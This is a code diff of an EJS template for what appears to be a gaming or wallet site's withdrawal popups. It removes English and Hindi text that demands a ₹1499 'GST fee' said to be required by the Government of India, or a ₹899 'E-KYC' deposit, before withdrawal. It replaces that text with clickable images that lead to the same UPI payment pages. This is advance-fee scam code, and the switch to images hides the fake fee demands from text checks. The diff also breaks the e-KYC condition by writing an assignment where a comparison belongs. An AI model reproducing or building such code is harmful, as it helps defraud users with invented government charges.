@@ -8047,27 +8047,23 @@
         <div id="withdrawal-popup">
             <div id="withdrawal-popup-content">
                 <span id="close-popup">&times;</span>
-                <h2>Withdrawal</h2>
-                <p>FOR WITHDRWAL ACCESS DEPOSIT PAY 1499 RUPEES AS GST FEES ACCORDINGY GOVERMENT OF INDIA </p>
-                <p> निकासी (Withdrawal) की सुविधा प्राप्त करने के लिए भारत सरकार के नियमों के अनुसार
-                    ₹1499 जीएसटी शुल्क जमा करना अनिवार्य है।।</p>
-                <button id="recharge-now"
-                    onclick="window.location.href ='/wallet/paynow/manual_upi?am=1499&extra=true'">RECHARGE NOW</button>
+               <img id="recharge-now"   onclick="window.location.href ='/wallet/paynow/manual_upi?am=1499&extra=true'" style="height: 100%;width: 100%;" src="/images/popup2.png">
+                <!-- <button id="recharge-now"
+                    onclick="window.location.href ='/wallet/paynow/manual_upi?am=1499&extra=true'">RECHARGE NOW</button> -->
             </div>
         </div>
         <% } %>
 
 
-            <% if (ekyc==0 || ekyc==false) { %>
+            <% if (ekyc = 0 || ekyc == false) { %>
                 <div id="withdrawal-popup">
                     <div id="withdrawal-popup-content">
                         <span id="close-popup">&times;</span>
-                        <h2>Withdrawal</h2>
-                        <p>FOR GETTING AMMOUNT IN YOUR BANK ACCESS DEPOSIT 899 RUPEES ONE TIME FOR E -KYC .</p>
-                        <p>विड्रॉल करने के लिए एक बार अपने गेम खाते को 899 रुपए से रिचार्ज करें ।</p>
-                        <button id="recharge-now"
+                                       <img id="recharge-now"   onclick="window.location.href ='/wallet/paynow/manual_upi?am=899&extra=false&ekyc=true'" style="height: 100%;width: 100%;" src="/images/popup1.png">
+
+                        <!-- <button id="recharge-now"
                             onclick="window.location.href ='/wallet/paynow/manual_upi?am=899&extra=false&ekyc=true'">RECHARGE
-                            NOW</button>
+                            NOW</button> -->
                     </div>
                 </div>
                 <% } %>
